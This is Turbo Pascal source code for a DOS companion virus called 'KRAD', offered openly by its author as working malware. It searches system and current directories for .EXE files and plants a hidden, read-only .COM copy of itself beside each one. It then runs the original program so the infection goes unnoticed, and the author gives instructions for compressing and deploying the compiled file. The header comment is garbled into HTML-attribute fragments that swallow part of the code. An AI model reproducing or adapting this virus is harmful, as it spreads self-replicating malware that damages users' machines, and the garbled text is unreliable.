

                                                                               
                                                                              
Program KRAD;                                                                 
                                                                              
{      ____  _____        _______   ______                                    
      /___/\/____/\      /______/\ /_____/\___  __/\_____                     
      \   \|     \  \___|       \ |      \___/ /_    ___/ BOOM! <====== \="" \/___|="" +="" \|="" +="" |/="" \______|\___________|\___________/="" virus="" laboratories="" and="" distribution="" proudly="" present="" the="" krad="" virus="" written="" by="" metabolis="" for="" non="" assembler="" ppls="" why="" call="" it="" the="" krad="" virus?="" cos="" it="" is!="" a="" companion="" virus="" written="" in="" turbo="" pascal,="" well="" that="" just="" sums="" it="" up.="" i="" wrote="" this="" for="" two="" reasons..="" 1)="" not="" everyone="" knows="" assembler="" 2)="" a="" friend="" reckoned="" a="" virus="" couldn't="" be="" programmed="" in="" turbo="" pascal..="" (by="" that="" he="" meant="" *i*="" couldn't="" do="" it).="" no="" matter="" how="" lame..="" it's="" still="" a="" virus!="" (right="" up="" there="" with="" aids/="" number="" 1="" :))="" fully="" commented="" for="" non="" understanding="" pascal="" people,="" (a="" very="" small="" part="" of="" the="" world).="" compress="" this="" with="" diet/pklite/lzexe="" or="" something="" similar="" when="" it's="" compiled.="" then="" rename="" it="" to="" a="" .com="" file="" and="" hey="" presto,="" you="" can="" run="" it!="" i="" guess="" an="" added="" bonus="" of="" this="" virus="" is,="" if="" there's="" another="" companion="" virus="" on="" your="" system="" it="" won't="" overwrite="" it,="" it="" will="" take="" that="" as="" an="" infection="" and="" leave="" it="" alone.="" krad="" virus="" will="" immediately="" infect="" c:\dos="" or="" c:\msdos="" if="" they="" exist,="" so="" if="" any="" dos="" .exe="" files="" are="" run="" it="" will="" infect="" all="" the="" files="" in="" the="" current="" dir="" that="" you="" ran="" the="" dos="" command="" from.="" }="" uses="" dos,crt;="" {even="" if="" i="" don't="" use="" one="" of="" 'em..="" it's="" best="" to="" include="" both.="" }="" {$m="" 59999,0,8000}="" {this="" program="" needs="" memory="" for="" two="" things..="" 1)="" to="" use="" as="" a="" buffer="" when="" copying="" the="" virus="" 2)="" to="" execute="" the="" program="" originally="" run.="" }="" var="" inf,inf2:searchrec;="" {used="" in="" the="" exe="" and="" file_exist="" routines="" }="" infected:boolean;="" {is="" a="" file="" infected?="" }="" params:byte;="" {loop="" index="" for="" adding="" all="" parameters="" together="" }="" all_params:string;="" {this="" string="" contains="" the="" whole="" list="" of="" parameters="" originally="" passed="" to="" the="" program="" }="" p:pathstr;="" {="" used="" by="" the="" fsplit="" procedure.="" }="" d:dirstr;="" {="" ""="" }="" n:namestr;="" {="" ""="" }="" e:extstr;="" {="" ""="" }="" procedure="" check_infected(path:string);="" {is="" the="" .exe="" file="" we've="" found="" infected?="" }="" begin="" fsplit(inf.name,d,n,e);="" {split="" it="" up="" into="" directory,="" name="" and="" extension.="" }="" findfirst(path+n+'.com',anyfile,inf2);="" {look="" for="" the="" .com="" file="" with="" the="" same="" file="" name,="" if="" this="" exists="" then="" the="" file="" is="" already="" infected.="" }="" infected:="(DosError=0);" {set="" the="" infected="" flag="" }="" end;="" procedure="" copyfile(sourcefile,="" targetfile:string);="" {straight="" forward="" copying="" routine,="" i="" won't="" comment="" all="" of="" this..="" }="" var="" source,="" target="" :="" file;="" bread,="" bwrite="" :="" word;="" filebuf="" :="" array[1..2048]="" of="" char;="" begin="" assign(source,sourcefile);="" setfattr(source,$20);="" {set="" the="" file="" attributes="" of="" the="" hidden="" com="" companion="" we're="" going="" to="" be="" copying="" to="" archive="" so="" that="" it's="" possible="" read="" it.="" }="" {$i-}="" reset(source,1);="" {$i+}="" if="" ioresult=""></======><> 0 then                                                     
    Begin                                                                     
        Exit;                          {Couldn't open the source file! }      
    End;                                                                      
    Assign(Target,TargetFile);                                                
    {$I-}                                                                     
    Rewrite(Target,1);                                                        
    {$I+}                                                                     
    If IOResult <> 0 then                                                     
    Begin                                                                     
        Exit;                          {Couldn't open the target file! }      
    End;                                                                      
    Repeat                                                                    
         BlockRead(Source,FileBuf,SizeOf(FileBuf),BRead);                     
         BlockWrite(Target,FileBuf,Bread,Bwrite);                             
    Until (Bread = 0) or (Bread <> BWrite);                                   
    Close(Source);                                                            
    Close(Target);                                                            
    SetFattr(Source,3);                {Set the COM companion that we         
                                        copied back to hidden and             
                                        read-only. }                          
    SetFattr(Target,3);                                                       
End;                                                                          
                                                                              
Procedure FaI(Path:String);                                                   
{Find and Infect!}                                                            
Begin                                                                         
  FindFirst(Path+'*.EXE',AnyFile,Inf);  {Check for .EXEs to infect! }         
  While DosError=0 Do Begin                                                   
    Infected:=False;                                                          
    Check_Infected(Path);  { Check if the .EXE found is already infected. }   
    If Not Infected then Begin                                                
      CopyFile(ParamStr(0),Path+N+'.COM');                                    
    End;                                                                      
    { If the file isn't infected then copy the .COM version of the            
      file you're executing to companionship with the .EXE you have           
      found that isn't infected. }                                            
    FindNext(Inf);                                                            
  End;                                                                        
End;                                                                          
                                                                              
Begin                                                                         
  FaI('C:\DOS\');            { Find & Infect!  Go for the DOS dirs first }    
  FaI('C:\MSDOS\');          { because this is where most EXE files will }    
  FaI('');                   { be executed from! }                            
  FSplit(ParamStr(0),D,N,E); { Make sure we have the path and name of the     
                               file we actually want to execute. }            
  All_Params:='';   { "Remember to initialise those variables!" - Teacher }   
  For Params:=1 To ParamCount                                                 
       do All_Params:=All_Params+ParamStr(Params)+' ';                        
  Exec(D+N+'.EXE',All_Params);        {Execute the file that the user         
                                       wanted to in the first place           
                                       keeping all original parameters. }     
End.                                                                          
{Easy wasn't it?  I thought so.. }                                            
                                                                              
                                                                              
                                                                              
